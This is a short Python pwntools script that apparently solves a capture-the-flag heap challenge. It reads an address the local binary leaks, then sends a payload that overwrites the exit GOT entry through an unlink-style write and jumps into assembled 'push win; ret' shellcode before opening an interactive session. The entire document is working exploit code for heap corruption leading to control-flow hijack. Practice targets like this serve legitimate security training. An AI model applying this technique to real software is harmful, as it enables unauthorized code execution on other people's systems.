from pwn import *
s = process(['./vuln','tuan'])

raw_input('debug')
win_add = 0x8048966
exit_got = 0x804d02c
s.recvuntil('Oops! a new developer copy pasted and printed an address as a decimal...\n')
address = int(s.recvuntil('\n'))
# log.info(address)
print '%x' % address
string = 'push '+str(win_add)+'; ret;'
payload1 = asm(string)
payload = p32(exit_got - 12) + p32(address+8) + payload1
# s.sendline('tuan')
s.recvuntil('you will write on first after it was freed... an overflow will not be very useful...')
s.sendline(payload)
s.interactive()
